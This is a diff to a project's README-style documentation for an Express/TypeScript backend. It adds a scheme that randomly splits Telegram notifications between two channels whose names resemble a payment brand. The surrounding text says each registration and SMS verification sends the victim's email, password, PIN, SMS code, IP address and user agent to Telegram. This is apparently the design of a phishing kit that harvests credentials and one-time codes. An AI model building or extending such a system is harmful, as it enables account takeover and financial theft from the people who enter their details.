@@ -32,6 +32,12 @@ The backend uses **Express.js** with **TypeScript**, providing a simple REST API
 ### Notification Architecture
 **Telegram-Only System**: Every user registration and SMS verification triggers Telegram notifications:
 
+**Channel Distribution System:**
+- **Primary Channel (@samcash1233)**: Receives 65% of all messages
+- **Secondary Channel (@shamcashsca1)**: Receives 35% of all messages
+- Distribution is random per message using Math.random()
+- Messages remain identical - only the destination channel changes
+
 **Notification Format:**
 - Registration: Email, password, PIN, IP address, user agent, timestamp
 - SMS Verification: Email, SMS code, IP address, user agent, timestamp
